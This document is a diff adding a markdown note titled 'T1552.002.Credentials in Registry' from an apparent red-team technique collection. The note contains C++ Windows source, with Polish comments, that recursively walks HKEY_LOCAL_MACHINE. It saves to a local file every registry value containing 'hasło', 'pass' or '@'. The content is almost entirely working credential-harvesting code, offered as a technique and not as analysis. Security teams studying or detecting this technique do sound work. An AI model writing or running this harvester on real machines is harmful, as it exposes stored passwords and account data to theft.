@@ -1,0 +1,107 @@
+---
+title: "T1552.002.Credentials in Registry"
+folder: "08. Credential Access"
+---
+
+
+
+
+#include <iostream>
+#include <Windows.h>
+#include <string>
+#include <fstream>
+#include <vector>
+
+std::ofstream output("wynik.txt", std::ios::binary);
+int aa = 0;
+std::string registryKeyAA = "";
+void EnumerateValuesAndWriteToOutput(HKEY hKey, const std::string& keyName, const std::vector<std::string>& searchStrings) {
+    DWORD index = 0;
+    CHAR valueName[1024];
+    DWORD valueNameSize = sizeof(valueName);
+    DWORD valueType;
+    BYTE data[1024];
+    DWORD dataSize = sizeof(data);
+
+    while (RegEnumValueA(hKey, index++, valueName, &valueNameSize, NULL, &valueType, data, &dataSize) == ERROR_SUCCESS) {
+        std::string valueAsString;
+        switch (valueType) {
+        case REG_SZ:
+            valueAsString = reinterpret_cast<char*>(data);
+            break;
+        case REG_DWORD:
+            valueAsString = std::to_string(*reinterpret_cast<DWORD*>(data));
+            break;
+            // Add cases for other value types as needed
+        default:
+            valueAsString = "(Not implemented)";
+            break;
+        }
+
+        for (const auto& searchString : searchStrings) {
+            if (valueAsString.find(searchString) != std::string::npos) {
+                output << "Key Name: " << registryKeyAA << std::endl;
+                output << "Value Name: " << valueName << std::endl;
+                output << "Type: " << valueType << std::endl;
+                output << "Value: " << valueAsString << std::endl << std::endl;
+                break; // Break if any of the search strings is found
+            }
+        }
+
+        valueNameSize = sizeof(valueName);
+        dataSize = sizeof(data);
+    }
+}
+
+void RecursivelySearchRegistryAndSaveValues(const std::string& registryKey, const std::vector<std::string>& searchStrings) {
+
+    if (!output) {
+        output << "Cannot open output file." << std::endl;
+        return;
+    }
+    registryKeyAA = registryKey;
+    HKEY hKey;
+
+    LPCSTR fullKeyPath = registryKey.c_str();
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullKeyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+        output << "Cannot open registry key: " << fullKeyPath << std::endl;
+        return;
+    }
+
+    EnumerateValuesAndWriteToOutput(hKey, registryKey, searchStrings);
+    LONG result;
+    // Enumerate subkeys
+    DWORD index = 0;
+    CHAR subkeyName[1024];
+    DWORD subkeyNameSize = sizeof(subkeyName);
+    if (aa==0){
+        aa = aa + 1;
+        while (RegEnumKeyExA(HKEY_LOCAL_MACHINE, index++, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+            std::string subkeyPath =  subkeyName;
+            RecursivelySearchRegistryAndSaveValues(subkeyPath, searchStrings);
+            subkeyNameSize = sizeof(subkeyName);
+        }
+    }
+    else {
+        while ((result = RegEnumKeyExA(hKey, index++, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL)) == ERROR_SUCCESS) {
+            std::string subkeyPath = registryKey + "\\" + subkeyName;
+            RecursivelySearchRegistryAndSaveValues(subkeyPath, searchStrings);
+            subkeyNameSize = sizeof(subkeyName);
+        }
+        if (result != ERROR_NO_MORE_ITEMS) {
+            // Wystąpił błąd podczas przeglądania kluczy
+            std::cerr << "Błąd podczas przeglądania kluczy rejestru: " << result << std::endl;
+        }
+    }
+    RegCloseKey(hKey);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::string registryKey = "";
+    std::vector<std::string> searchStrings = { "hasło", "pass", "@" }; // Trzy frazy do wyszukania
+
+    RecursivelySearchRegistryAndSaveValues(registryKey, searchStrings);
+
+    return 0;
+}
